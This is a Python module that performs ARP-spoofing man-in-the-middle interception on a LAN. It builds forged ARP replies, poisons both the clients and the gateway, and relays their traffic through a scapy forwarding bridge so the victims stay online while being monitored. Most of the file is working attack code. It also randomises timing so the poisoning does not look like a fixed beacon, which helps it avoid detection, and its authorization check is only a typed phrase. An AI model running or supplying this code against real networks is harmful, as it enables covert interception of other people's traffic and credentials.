"""arpspoof.py - OPT-IN, authorization-gated whole-LAN capture (bettercap pattern).

WHY THIS EXISTS
  On a normal switched Wi-Fi/Ethernet LAN, a host-only capture only sees its
  own traffic. To monitor OTHER devices' traffic (the user's explicit goal:
  "detects other devices, not just localhost"), the established approach
  (bettercap, ettercap) is ARP-spoof: tell each victim "I am the gateway" and
  tell the gateway "I am the victim", so their traffic routes through you and
  becomes visible to your capture. You then forward it so the LAN keeps working.
  This module implements BOTH the poisoning AND a transparent L2 forwarding
  bridge so poisoned clients stay online.

AUTHORIZATION & SAFETY (non-negotiable)
  * This is OFF by default and ONLY activates with explicit flags.
  * Requires administrator/root (refuses otherwise).
  * Requires the operator to type a confirmation that the LAN is theirs and
    authorized for monitoring.
  * Operates ONLY between discovered LAN clients and the local gateway.
  * Restores original ARP mappings on exit (3x rapid correct replies).
  * Never targets external networks or third parties.
  This matches the pentest hard-lines: authorized-only, no live/illegal targets.

The packet-construction logic is unit-testable WITHOUT injecting (build_spoof
returns the bytes); live injection + the forwarding bridge are gated behind
admin + confirmation.
"""
from __future__ import annotations

import os
import sys
import time
import random
import threading

_HERE = os.path.dirname(os.path.abspath(__file__))


_BRIDGE_ERRS = 0
_BRIDGE_ERR_CAP = 5


def is_admin() -> bool:
    try:
        import ctypes
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        try:
            return os.geteuid() == 0
        except Exception:
            return False


def build_spoof(victim_ip: str, victim_mac: str, gateway_ip: str,
                attacker_mac: str) -> bytes:
    """Construct a gratuitous ARP reply: 'gateway_ip is at attacker_mac',
    sent to the victim. Returns raw bytes (testable without injection).

    Layered here manually (not via scapy) so the construction is auditable
    and unit-testable in isolation.
    """
    def mac_bytes(m):
        return bytes(int(x, 16) for x in m.split(":"))

    dst = mac_bytes(victim_mac)
    src = mac_bytes(attacker_mac)
    eth = dst + src + b"\x08\x06"  # EtherType ARP
    # ARP: htype=1, ptype=0x0800, hlen=6, plen=4, op=2 (reply)
    arp = (b"\x00\x01" b"\x08\x00" b"\x06" b"\x04" b"\x00\x02"
           + src                                   # sender MAC (=attacker)
           + _ip_bytes(gateway_ip)                 # sender IP (=gateway, spoofed)
           + dst                                   # target MAC (=victim)
           + _ip_bytes(victim_ip))                 # target IP (=victim)
    return eth + arp


def _ip_bytes(ip: str) -> bytes:
    return bytes(int(x) for x in ip.split("."))


def confirm_authorization(subnet: str) -> bool:
    """Require an explicit typed confirmation. Returns True only if the
    operator types the exact phrase. Never auto-approves."""
    phrase = "YES-I-AM-AUTHORIZED"
    print("\n" + "=" * 60)
    print("  ARP-SPOOF WHOLE-LAN CAPTURE  —  AUTHORIZATION REQUIRED")
    print("=" * 60)
    print(f"  Target LAN : {subnet}")
    print("  This will ARP-spoof LAN clients <-> gateway so their traffic")
    print("  becomes visible to YOUR monitor. It must be YOUR authorized LAN.")
    print("  ARP tables are restored on exit. Illegal use is your liability.")
    print(f"  Type exactly: {phrase}")
    print("=" * 60)
    try:
        ans = input("  confirm > ").strip()
    except (EOFError, KeyboardInterrupt):
        return False
    return ans == phrase


def _forward_bridge(gateway_ip: str, gateway_mac: str, clients: dict,
                    attacker_mac: str, iface, stop_event):
    """Transparent L2 forwarding so poisoned clients keep internet access.

    Runs as a daemon thread during the authorized ARP-spoof session. For every
    forwarded frame it rewrites ONLY the Ethernet header (src=us, dst=real next
    hop) and retransmits, leaving IP/MAC payload intact. Loop-prevention drops
    any frame whose Ethernet src is already us.

    IMPORTANT (bug fixed): scapy's Ether.src / Ether.dst are STRINGS, not bytes.
    We normalize all MACs to upper-case strings and compare/assign strings, else
    str == bytes is always False and the bridge forwards nothing (victim offline).
    """
    from scapy.all import sniff, Ether, IP, sendp
    atk_s = attacker_mac.upper()
    gw_s = gateway_mac.upper()
    client_macs_s = {ip: m.upper() for ip, m in clients.items()
                     if m and m != "?"}

    def _cb(pkt):
        try:
            if Ether not in pkt or IP not in pkt:
                return
            eth = pkt[Ether]
            # loop prevention: ignore frames we just emitted
            if eth.src.upper() == atk_s:
                return
            ip = pkt[IP]
            sip, dip = ip.src, ip.dst
            # victim -> internet: addressed to real gateway, from us
            if sip in client_macs_s and dip == gateway_ip:
                fwd = pkt.copy()
                fwd[Ether].src = atk_s
                fwd[Ether].dst = gw_s
                sendp(fwd, verbose=False, iface=iface)
            # internet -> victim: addressed to real client, from us
            elif dip in client_macs_s and sip == gateway_ip:
                fwd = pkt.copy()
                fwd[Ether].dst = client_macs_s[dip]
                fwd[Ether].src = atk_s
                sendp(fwd, verbose=False, iface=iface)
        except Exception as e:
            # surface bridge failures (e.g., iface vanished) instead of
            # silently stopping forwarding; cap the count so a dead iface
            # doesn't flood stderr at 1000 pkt/s.
            global _BRIDGE_ERRS
            if _BRIDGE_ERRS < _BRIDGE_ERR_CAP and "stop" not in str(e).lower():
                _BRIDGE_ERRS += 1
                print(f"[bridge!] forward error ({_BRIDGE_ERRS}/{_BRIDGE_ERR_CAP}): {e}",
                      file=sys.stderr)

    try:
        sniff(store=0, prn=_cb, iface=iface,
              stop_filter=lambda p: bool(stop_event and stop_event.is_set()))
    except Exception:
        pass


def run_arpspoof(gateway_ip: str, gateway_mac: str, clients: dict,
                 attacker_mac: str, duration: int = 60, stop_event=None,
                 iface=None):
    """Live ARP-spoof loop WITH transparent forwarding bridge.

    Injects spoofed ARP replies to clients + gateway, forwards their traffic so
    they stay online, and restores on exit. Runs the bridge as a daemon thread.

    Returns number of spoof cycles run.
    """
    from scapy.all import sendp, Ether, ARP
    # Start transparent forwarding so poisoned clients keep connectivity.
    bridge = threading.Thread(
        target=_forward_bridge,
        args=(gateway_ip, gateway_mac, clients, attacker_mac, iface, stop_event),
        daemon=True)
    bridge.start()
    cycle = 0
    start = time.time()
    try:
        while True:
            if stop_event and stop_event.is_set():
                break
            if duration and (time.time() - start) >= duration:
                break
            for vip, vmac in clients.items():
                if vip == gateway_ip:
                    continue
                # tell victim: gateway is us
                sendp(Ether(dst=vmac) / ARP(op=2, pdst=vip, hwdst=vmac,
                                           psrc=gateway_ip, hwsrc=attacker_mac),
                      verbose=False, iface=iface)
                # tell gateway: victim is us
                sendp(Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip,
                                                 hwdst=gateway_mac, psrc=vip,
                                                 hwsrc=attacker_mac),
                      verbose=False, iface=iface)
            cycle += 1
            # jitter so the poison pattern is not a fixed 2s beacon
            time.sleep(random.uniform(1.5, 4.0))
    finally:
        _restore(clients, gateway_ip, gateway_mac, attacker_mac, iface)
    return cycle


def _restore(clients, gateway_ip, gateway_mac, attacker_mac, iface=None):
    """Send 3 rapid rounds of correct ARP replies so clients/gateway re-learn
    true mappings (used on clean exit and Ctrl-C)."""
    from scapy.all import sendp, Ether, ARP
    try:
        for _ in range(3):
            for vip, vmac in clients.items():
                if vip == gateway_ip:
                    continue
                sendp(Ether(dst=vmac) / ARP(op=2, pdst=vip, hwdst=vmac,
                                           psrc=gateway_ip, hwsrc=gateway_mac),
                      verbose=False, iface=iface)
                sendp(Ether(dst=gateway_mac) / ARP(op=2, pdst=gateway_ip,
                                                 hwdst=gateway_mac, psrc=vip,
                                                 hwsrc=vmac), verbose=False,
                      iface=iface)
            time.sleep(0.2)
        print("[+] ARP tables restored")
    except Exception as e:
        print(f"[!] restore failed (manual fix may be needed): {e}")
